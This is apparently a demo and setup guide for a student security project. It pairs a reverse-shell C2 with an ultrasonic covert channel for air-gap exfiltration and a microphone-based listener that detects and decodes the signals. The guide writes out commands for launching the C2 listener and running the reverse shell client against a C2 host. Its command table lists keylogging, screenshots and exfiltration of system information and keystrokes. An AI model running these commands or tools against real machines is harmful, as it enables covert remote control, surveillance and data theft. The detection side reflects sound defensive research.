# Multi-PC Demo & Integration Guide
## Ultrasonic Covert Channel & Reverse Shell System (Backend 2 Architecture)

This guide explains how to set up, run, and demonstrate the **Air-Gapped Acoustic Exfiltration** and **Reverse Shell** system across two separate PCs or on a single development machine.

---

## 🎯 Architecture Overview

```
 +----------------------------------+          +------------------------------------+
 |         PC 1 (Target / Attacker) |          |      PC 2 (Listener / Receiver)    |
 |                                  |          |                                    |
 |  [Reverse Shell Client]          |          |  [Acoustic Listener / SOC Monitor] |
 |  (reverse.py)                    |          |  (acoustic_listener.py)            |
 |         OR                       |          |         OR                         |
 |  [Attack Simulator Backend]      |          |  [Audio Streamer Service]          |
 |  (attack_simulator_api.py)       |          |  (audio_streamer.py :8001)         |
 |                |                 |          |                 ^                  |
 |          Speaker Emits           |          |           Microphone Hears         |
 |        18.5kHz - 21.0kHz         |          |          18.5kHz - 21.0kHz         |
 +----------------+-----------------+          +-----------------+------------------+
                  |                                              ^
                  | ~ ~ ~ Inaudible Ultrasonic Sound ~ ~ ~ ~ ~ ~ |
                  +==============================================+
```

---

## 🚀 Scenario A: 2-PC Live Acoustic Air-Gap Demo

### Step 1: Prepare PC 2 (The Receiver / Defender PC)
On **PC 2**, start the acoustic receiver to listen on the microphone:
```bash
cd g:/files1
python acoustic_listener.py
```
*(Optionally specify a specific microphone device with `python acoustic_listener.py --device 1`)*

**PC 2 is now actively monitoring for ultrasonic BFSK signals (18,500 Hz & 21,000 Hz).**

---

### Step 2: On PC 1 (Target / Attacker PC)

#### Option 1: Using the Reverse Shell C2
1. On your C2 Server machine (or PC 1), start the C2 Listener:
   ```bash
   cd g:/files1/Reverse_Shell-main
   python shell.py --bind 0.0.0.0 --port 54321
   ```
2. Run the Reverse Shell Client on the target:
   ```bash
   cd g:/files1/Reverse_Shell-main
   python reverse.py --host <C2_SERVER_IP> --port 54321
   ```
3. In the C2 shell prompt, issue acoustic exfiltration commands:
   - `acoustic_emit SIH2026_SECRET_FLAG_A1`
   - `acoustic_sysinfo`
   - `acoustic_keylog`

🔊 **Result**: PC 1's speaker emits inaudible 18.5kHz/21kHz sound.
🎯 **Detection**: PC 2's screen immediately flashes a **🚨 FORENSIC ALERT** displaying the exact decoded text, confidence score, and timestamp!

---

#### Option 2: Using the Attack Simulator REST API (FastAPI)
1. On PC 1, start the simulator API:
   ```bash
   cd g:/files1
   python -m uvicorn attack_simulator_api:app --host 0.0.0.0 --port 8002 --reload
   ```
2. Open Swagger docs in your browser: `http://localhost:8002/docs`
3. Call `POST /simulate/acoustic-exfiltrate`:
   ```json
   {
     "source_type": "custom",
     "custom_text": "AIRGAP_BREACH_COVERT_EXFIL",
     "emit_audio": true
   }
   ```
4. PC 1 plays the ultrasonic BFSK waveform and PC 2 captures and decodes it live!

---

## 🧪 Scenario B: Standalone Single-PC Testing & Validation

If you want to test everything on a single laptop:

### 1. Test Codec Round-Trip (No audio devices needed)
```bash
cd g:/files1
python payload_codec.py
```

### 2. Test Audio Streamer with File Replay
```bash
cd g:/files1
python audio_streamer.py --source file --file test_payload.wav
```

### 3. Test Audio Streamer with Real-time Microphone & WebSocket
```bash
cd g:/files1
python -m uvicorn audio_streamer:app --port 8001 --reload
```
- WebSocket Audio Stream: `ws://localhost:8001/stream/audio`
- WebSocket Forensic Alerts: `ws://localhost:8001/stream/forensics`
- Check status: `http://localhost:8001/stream/status`

---

## 📋 Full Command Reference

| Command | Location | Description |
|---|---|---|
| `acoustic_emit <text>` | `reverse.py` / `shell.py` | Encodes text & plays 18.5kHz/21kHz tone on target |
| `acoustic_keylog` | `reverse.py` / `shell.py` | Exfiltrates logged keystrokes via ultrasound |
| `acoustic_sysinfo` | `reverse.py` / `shell.py` | Exfiltrates hostname/IP/privilege via ultrasound |
| `keylog_start` | `reverse.py` / `shell.py` | Starts background keystroke logger |
| `keylog_dump` | `reverse.py` / `shell.py` | Dumps logged keystrokes over socket |
| `screenshot` | `reverse.py` / `shell.py` | Takes target screen capture |
| `POST /simulate/generate` | `attack_simulator_api.py` | Generates ultrasonic WAV payload |
| `POST /simulate/transmit` | `attack_simulator_api.py` | Emits audio (`mode="audio"`) or injects (`mode="virtual"`) |
| `POST /simulate/acoustic-exfiltrate` | `attack_simulator_api.py` | High-level acoustic emission endpoint |
| `WS /stream/audio` | `audio_streamer.py` | Broadcasts 48kHz audio chunks for AI1/DSP |
| `WS /stream/forensics` | `audio_streamer.py` | Broadcasts decoded covert payloads |
